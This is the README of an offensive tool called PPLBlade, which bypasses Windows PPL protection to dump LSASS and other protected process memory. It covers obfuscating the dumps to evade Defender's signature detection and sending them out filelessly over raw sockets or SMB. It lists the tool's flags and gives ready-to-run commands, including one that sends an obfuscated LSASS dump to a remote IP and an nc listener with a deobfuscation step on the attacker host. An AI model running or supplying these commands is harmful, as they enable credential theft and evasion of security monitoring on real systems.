# PPLBlade
Protected Process Dumper Tool

Key functionalities:
1) Bypassing PPL protection
2) Obfuscating memory dump files to evade defender signature-based detection mechanisms
3) Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk(fileless dump)


```
Usage of PPLBlade.exe:
  -driver string
        Path where the driver file will be dropped (default "D:\\releasetest\\PPLBlade\\PPLBLADE.SYS")
  -dumpmode string
        Dump mode [local|network] (default "local")
  -dumpname string
        Name of the dump file (default "PPLBlade.dmp")
  -handle string
        Method to obtain target process handle [direct|procexp] (default "direct")
  -help
        Prints this help message
  -ip string
        IP of the remote server
  -key string
        XOR Key for obfuscation (default "PPLBlade")
  -mode string
        Kill or Dump process [dump|decrypt|cleanup|dothatlsassthing] (default "dump")
  -name string
        Process name of target process
  -network string
        Method for network transfer (default "raw")
  -obfuscate
        Obfuscate dump file
  -pass string
        SMB password
  -pid int
        PID of target process (prioritized over process name)
  -port int
        PORT on the remote server
  -quiet
        Quiet mode
  -service string
        Name of the service (default "PPLBlade")
  -share string
        share name
  -user string
        SMB username
```


**Examples:**

Basic POC that uses PROCEXP152.sys to dump lsass:

`PPLBlade.exe --mode dothatlsassthing`

Upload the obfuscated LSASS dump onto a remote location:

`PPLBlade.exe --mode dump --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234 --handle procexp --name lsass.exe`

Attacker host:
```
nc -lnp 1234 > lsass.dmp
python3 deobfuscator.py --dumpname lsass.dmp
```

